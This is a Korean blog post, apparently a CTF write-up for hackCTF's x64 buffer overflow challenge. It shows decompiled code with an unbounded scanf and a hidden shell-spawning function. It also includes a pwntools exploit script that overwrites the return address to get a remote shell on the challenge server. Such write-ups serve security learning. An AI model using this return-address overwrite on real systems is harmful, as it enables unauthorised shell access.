---
layout: post
title:  "[hackCTF]x64 Buffer Overflow"
date:   2020-02-18
---

hackCTF pwnable 다섯번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)


## ida - main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+10h] [rbp-110h]
  int v5; // [rsp+11Ch] [rbp-4h]

  _isoc99_scanf("%s", &s, envp); // stdin에서 문자열 형식으로 입력 받아 s에 저장
  v5 = strlen(&s); // s의 길이를 v5에 저장
  printf("Hello %s\n", &s, argv);
  return 0;
}
```
## ida - callMeMaybe
```c
int callMeMaybe()
{
  char* path; // [rsp+0h] [rbp-20h]
  const char* v2; // [rsp+8h] [rbp-18h]
  __int64 v3; // [rsp+10h] [rbp-10h]

  path = "/bin/bash";
  v2 = "-p";
  v3 = 0LL;
  return execve("/bin/bash", &path, 0LL); // 쉘을 띄울 수 있다!
}
```
<br>

정리해보자.<br><br>
***

| ret |           |
|:---:|:---------:|
| sfp |  (8byte)  |
| rbp |           |
| ... |           |
|  s  | rbp-0x110 |

***
<br>
callMeMaybe 함수를 실행시키면 쉘을 띄울 수 있다. 이전 문제와 동일한 방식으로 scanf를 통해 문제를 해결하자.<br><br>
목표 : ret을 callMeMaybe 함수의 주소로 덮기<br>
취약점 : scanf("%s", &s, envp)<br><br><br>
+) callMeMaybe 함수의 주소는 다음과 같다.

![0501](https://drive.google.com/uc?id=1LnLNJrmt7KXM1S5HHWFkw0vQywbEDzOd)

## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3004)

payload = "\x90"*0x118+p64(0x400606)

p.sendline(payload)

p.interactive()
```

## 결과
![0502](https://drive.google.com/uc?id=1rK_l0M2NmPspC1udiy0B72-BrBogAAN8)
